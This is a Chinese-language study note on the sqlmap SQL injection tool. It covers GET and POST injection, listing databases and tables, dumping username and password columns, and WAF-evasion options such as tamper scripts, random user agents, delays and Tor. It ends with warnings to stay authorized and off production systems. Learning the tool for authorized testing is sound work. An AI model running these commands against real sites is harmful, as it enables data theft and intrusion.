## 1. sqlmap 是什么
sqlmap 是一款开源的自动化 SQL 注入检测与利用工具，能自动发现注入点、识别数据库类型、并拖库/提权。
它支持 MySQL、PostgreSQL、MSSQL、Oracle、SQLite 等几乎所有主流数据库，覆盖 GET/POST/Cookie/HTTP 头等注入入口，并提供 tamper 脚本绕过 WAF、OS 级命令执行、文件读写等高级能力。
```shell
# 启动sqlmap
py sqlmap.py --version
```

---
## 2. GET 注入
GET 请求的注入参数直接出现在 URL 的查询字符串里，是 sqlmap 最省事的用法。

### 2.1 基本检测
```bash
# ⭐ 最简用法：把带参数的完整 URL 丢给 sqlmap，它会自动判断是否有注入
sqlmap -u "http://example.com/product.php?id=1" --batch

# ⭐ --batch：所有询问都用默认回答，适合自动化、不交互
# ⭐ 若检测到注入，sqlmap 会列出可用的注入类型（Boolean/Time/Union/Error）
```

> [!tip] 小技巧
> 加 `-v 3` 可以看到 sqlmap 实际发出的 payload，方便学习注入原理。
```
-v 0 只输出错误信息
-v 1 输出基本信息 + 警告（默认）
-v 2 输出详细信息 + 调试消息
-v 3 **打印实际发送的HTTP请求Payload（最常用）**
-v 4 打印HTTP请求头
-v 5 打印HTTP响应头
-v 6 打印完整HTTP响应包（全部网页返回内容）
```
### 2.2 拿到数据库清单
```bash
# ⭐ 列出所有数据库名
sqlmap -u "http://example.com/product.php?id=1" --dbs

# ⭐ 获取当前网站正在使用的数据库名字
sqlmap -u "http://xxx?id=1" --batch --current-db

# ⭐ 指定库后列出表 （-D 指定数据库名）
sqlmap -u "http://example.com/product.php?id=1" -D testdb --tables

# ⭐ 指定表后列出列 （ -T：table，指定表名）
sqlmap -u "http://example.com/product.php?id=1" -D testdb -T users --columns

# ⭐ 直接拖指定列的数据（--dump是拖具体数据，需要搭配-D(库) -T(表)）
sqlmap -u "http://example.com/product.php?id=1" -D testdb -T users -C username,password --dump
```

---

## 3. POST 注入
POST 请求参数在请求体里，URL 上看不到。sqlmap 提供多种方式喂给它请求体。

### 3.1 用 `--data` 直接传参（最常见）
```bash
# ⭐ --data：手动指定 POST 数据，sqlmap 会逐个参数测试注入
sqlmap -u "http://example.com/login.php" --data="username=admin&password=123456" --batch
```

### 3.2 用 `-r` 读抓包文件（最稳妥）
> [!abstract] 原理
> 用 Burp / 浏览器开发者工具把完整 HTTP 请求（含请求行、头、请求体）存成 `req.txt`，`-r` 让 sqlmap 原样重放，能精确保留 Cookie、Content-Type 等上下文，避免手动拼参出错。

```bash
# ⭐ -r：从文件读取完整 HTTP 请求（请求体里的参数会被自动当作注入点）
sqlmap -r req.txt --batch

# ⭐ 若只想测请求体里某个参数，用 -p 指定
sqlmap -r req.txt -p password --batch
```
### 3.3 自动填充表单 `--forms`
```bash
# ⭐ --forms：让 sqlmap 自动解析页面里的 <form>，填充并提交测试
sqlmap -u "http://example.com/login.php" --forms --batch
```
### 3.4 JSON / 复杂请求体
```bash
# ⭐ 现代接口常是 JSON，用 --data 原样传，并加 --headers 指定 Content-Type
sqlmap -u "http://example.com/api/login" \
       --data='{"user":"admin","pass":"123456"}' \
       --headers="Content-Type: application/json" \
       --batch
```

> [!bug] 常见错误
> 忘记带 `--headers="Content-Type: application/json"` 时，服务端可能按表单解析 JSON，注入点根本不生效，白忙活。

---

## 4. 绕过 WAF 的参数

### 4.1 核心绕过参数一览

| 参数                                                          | 作用                 | 说明                                   |
| ----------------------------------------------------------- | ------------------ | ------------------------------------ |
| `--tamper=TAMPER`                                           | **最关键**的绕过手段       | 用脚本对 payload 做编码/变形，可叠加多个（逗号分隔）      |
| `--level=LEVEL`                                             | 测试等级 1–5           | 等级越高，测的注入点越多（含 Cookie/UA/Referer 等头） |
| `--risk=RISK`                                               | 风险等级 1–3           | 等级越高，用的 payload 越激进（时间盲注、OR、堆叠）      |
| `--random-agent`                                            | 随机伪造 User-Agent    | 绕过基于 UA 的黑名单/风控                      |
| `--delay=DELAY`                                             | 每次请求间隔秒数           | 慢速绕过基于请求频率的限流/拦截                     |
| `--proxy=PROXY` / `--tor`                                   | 走代理 / Tor 网络       | 隐藏来源 IP，绕过 IP 封禁类 WAF                |
| `--chunked`                                                 | 分块传输编码             | 把请求体拆块，部分 WAF 不重组检测，可绕过              |
| `--hpp`                                                     | HTTP 参数污染          | 同名参数多次出现，绕过只取首个参数的 WAF 规则            |
| `--identify-waf`                                            | 识别前方 WAF 类型        | 先摸清对手是谁，再对症下药选 tamper                |
| `--invalid-bignum` / `--invalid-logic` / `--invalid-string` | 注入无效值试探            | 改变注入「探针」形态，绕过对固定错误响应的检测              |
| `--hex`                                                     | payload 用 HEX 编码传输 | 规避对明文关键字的匹配                          |
| `--no-cast`                                                 | 关闭强制类型转换           | 某些 WAF 对 CAST/CHAR 组合敏感时可关           |
| `--eval=CODE`                                               | 请求前执行 Python 代码片段  | 动态生成 token/签名，绕过需联动校验的防护（高危）         |

### 4.2 实战组合示例
```bash
# ⭐ 先识别前方是什么 WAF
sqlmap -u "http://example.com/product.php?id=1" --identify-waf

# ⭐ 经典绕过组合：tamper 变形 + 随机 UA + 慢速 + 高等级高风险的 payload
sqlmap -u "http://example.com/product.php?id=1" \
       --tamper=space2comment,charencode,randomcase \  # ⭐ 多个脚本逗号叠加：空格转注释/字符编码/随机大小写
       --random-agent \                          # ⭐ 随机 UA 骗过 UA 黑名单
       --level=3 --risk=2 \                      # ⭐ 提高测试与风险等级扩大覆盖
       --delay=1 \                               # ⭐ 每请求间隔 1 秒，绕过频率限流
       --batch
```

> [!tip] 常用 tamper 脚本
> - `space2comment`：把空格替换为 `/**/`，躲过对空格的拦截
> - `charencode`：对字符做 URL 编码
> - `randomcase`：关键字随机大小写（如 `UnIoN`），骗过大小写敏感的规则
> - `base64encode`：整体 base64 编码
> - `between`：用 `BETWEEN` 替换 `>`/`<` 比较符
> - 查看全部内置脚本：`sqlmap --list-tampers`

---

## 5. `--risk` 是什么含义
> [!important] 关键结论
> `--risk` 控制 **sqlmap 使用的 payload 激进程度（会不会动数据）**，范围 **1–3，默认 1**。

| 等级 | 行为 | 风险点 |
|------|------|--------|
| **1（默认）** | 仅用「安全」的 payload：UNION 查询、布尔盲注、报错注入 | 基本只读，不破坏数据 |
| **2** | 在 1 基础上**增加基于时间的盲注**（Time-based） | 会让目标响应变慢，但仍是只读探测 |
| **3** | 在 2 基础上**增加 OR 注入与堆叠查询（Stacked queries）** | ⚠️ 堆叠查询可能执行 `UPDATE`/`DELETE`/`INSERT`，**会修改或删除数据** |

> [!warning] 注意
> risk 越高不代表「成功率越高」，只是「手段越多」。对生产/未授权目标用 `--risk=3` 极易造成数据破坏甚至被追责，**默认 1 足够绝大多数场景**。

---

## 6. `--level` 是什么含义
> [!important] 关键结论
> `--level` 控制 **sqlmap 测试哪些注入点 / 覆盖多广**，范围 **1–5，默认 1**。

| 等级 | 额外测试的注入位置 | 说明 |
|------|-------------------|------|
| **1（默认）** | 仅 URL 查询字符串参数 | 最基础、最快 |
| **2** | 在 1 基础上 + **Cookie** 参数 | 开始测 Cookie 注入 |
| **3** | 在 2 基础上 + **User-Agent、Referer** 等 HTTP 头 | 测头注入 |
| **4** | 在 3 基础上 + 更多边界情况 | 覆盖面更广 |
| **5** | 在 4 基础上 + **Host 头** 等极偏位置 | 最深扫描，也最慢 |

> [!abstract] 原理
> 很多注入点藏在 HTTP 头（如 `User-Agent`、`Referer`、`Cookie`）里，默认 `--level=1` 只看 URL 参数会漏掉。等级越高，sqlmap 对每个点尝试的 payload 组合也越多，耗时随之上升。

> [!tip] 经验值
> 普通测试用 `--level=3 --risk=2` 是性价比最高的组合；确认存在头注入或 WAF 很硬时再上 `--level=5`。

---

## 7. 常用参数速查表

| 参数 | 含义 | 示例 |
|------|------|------|
| `-u URL` | 目标 URL（GET） | `sqlmap -u "http://x/a.php?id=1"` |
| `--data` | POST 数据 | `--data="u=a&p=b"` |
| `-r FILE` | 读抓包请求文件 | `sqlmap -r req.txt` |
| `-p PARAM` | 指定测试参数 | `-p id` |
| `--dbs` / `--tables` / `--columns` / `--dump` | 枚举库/表/列/拖数据 | 见第 2 节 |
| `--current-db` | 当前数据库名 | — |
| `--current-user` | 当前数据库用户 | — |
| `--tamper` | 绕过 WAF 脚本 | `--tamper=space2comment` |
| `--level` / `--risk` | 测试/风险等级 | `--level=3 --risk=2` |
| `--random-agent` | 随机 UA | — |
| `--batch` | 全自动无交互 | — |
| `--proxy` / `--tor` | 代理 / Tor | `--proxy="http://127.0.0.1:8080"` |
| `--delay` | 请求间隔 | `--delay=1` |
| `--identify-waf` | 识别 WAF | — |
| `--flush-session` | 清空历史会话重测 | 换参数后常用 |

---

## 8. 本篇关联
- 实战靶场环境搭建见 [[靶场phpstudy]]
- 抓包配合 sqlmap 用 `-r` 读请求，抓包工具见 `工具/BurpSuite`
- 注入原理与手工 payload 可补 [[基础入门]] 下的 SQL 注入基础
> [!danger] 段错误式提醒
> 记住：工具越强，越要守住「授权 + 备份 + 不动生产」三条底线。拿着 sqlmap 乱扫外网，进去的不会是数据，是局子。
